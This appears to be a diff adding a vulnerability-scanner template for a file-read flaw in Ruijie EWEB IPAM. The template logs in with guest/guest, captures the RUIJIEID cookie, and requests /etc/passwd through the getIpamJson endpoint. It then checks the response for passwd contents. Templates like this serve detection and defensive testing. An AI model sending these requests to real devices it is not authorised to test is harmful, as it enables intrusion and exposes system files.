@@ -1,0 +1,44 @@
+id: ruijie-eweb-ipam-anyfile-read
+info:
+  name: Ruijie EWEB IPAM File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=guest&password=guest?
+    extractors:
+      - type: regex
+        name: ruijie_cookie
+        part: header
+        regex:
+          - "RUIJIEID=(.*?);"
+        internal: true
+  - raw:
+      - |
+        POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: RUIJIEID={{ruijie_cookie}}; user=guest
+        Content-Type: application/x-www-form-urlencoded
+
+        path=/etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: status
+        status:
+          - 200
